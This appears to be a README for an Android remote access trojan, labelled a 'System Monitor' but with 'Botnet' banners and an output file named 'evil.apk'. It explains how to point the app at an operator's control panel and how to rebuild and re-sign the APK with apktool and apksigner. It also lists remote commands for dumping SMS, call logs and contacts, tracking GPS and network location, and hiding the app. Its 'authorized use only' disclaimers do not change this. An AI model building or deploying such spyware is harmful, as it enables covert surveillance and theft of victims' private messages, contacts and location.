# Configuration & Usage Guide

<p align="center">
  <img src="Rat-kali-php-Botnet.png" alt="System Monitor Banner" width="700">
</p>

<p align="center">
  <img src="Rat-vps-php-Botnet.png" alt="System Monitor Banner" width="700">
</p>

## 1. Panel Configuration

### Edit the Panel URL
1. Decompile the APK or edit it with a tool of your choice.
2. Open `assets/config.txt`.
3. Set your panel address:

```ini
PANEL_URL=http://YOUR_IP:8080
```

**Security:** Never publish real credentials or a live `PANEL_URL` in a public repository.

### Manual APK Modification

```bash
apktool d SystemMonitor.apk -o SystemMonitor_work
nano SystemMonitor_work/assets/config.txt
apktool b SystemMonitor_work -o evil.apk

keytool -genkeypair -keystore key.jks -alias k -keyalg RSA \
  -keysize 2048 -validity 10000 \
  -storepass android -keypass android \
  -dname "CN=System Monitor"

apksigner sign --ks key.jks --ks-pass pass:android \
  --key-pass pass:android --out evil-signed.apk evil.apk
```

---

## 2. Build Scripts

| Script | Environment |
|---|---|
| `build-vps-php-Botnet.sh` | VPS / generic Linux server |
| `build-kali-php-Botnet.sh` | Kali Linux / pre-provisioned environments |

Refer to the selected script for edition-specific setup and toolchain requirements.

---

## 3. Features & Capabilities

### Device Information
- `/info` — Display basic device information.
- `/online` — Check agent availability.
- `/battery` — Report battery status.

### Location Services
- `/location_gps` — Request a GPS location, subject to device permissions.
- `/location_net` — Request a network-based location, subject to device permissions.
- `/location_history` — View saved location history, if enabled.

Location accuracy and background operation depend on Android permissions, power-management settings, and device configuration.

### Other Commands

| Category | Commands |
|---|---|
| SMS | `/sms_dump`, `/sms_send` |
| Calls | `/call_log` |
| Contacts | `/contacts`, `/contacts_add`, `/contacts_del` |
| System | `/open_url` |
| App Controls | `/hide`, `/show`, `/status` |

Command availability depends on the build edition, implementation, and granted permissions. Use personal-data features only on devices you own or are explicitly authorized to administer, with informed consent.

---

## 4. Requirements

- Android device or emulator
- Required Android build tools for the selected build
- Apktool, where required by the project

Refer to the project's build script for edition-specific setup instructions.

---

## 5. Security & Privacy

- Use only on devices you own or are authorized to administer.
- Obtain informed consent before accessing personal data or location.
- Protect panel credentials and other private configuration.
- Review Android permissions and background-execution restrictions.
- Do not distribute builds containing real credentials.

---

## 6. Disclaimer

This project is intended for authorized device administration and legitimate security research. You are responsible for obtaining the necessary permissions and complying with applicable laws.

---

<p align="center">
  <sub>System Monitor Agent · Authorized Use Only</sub>
</p>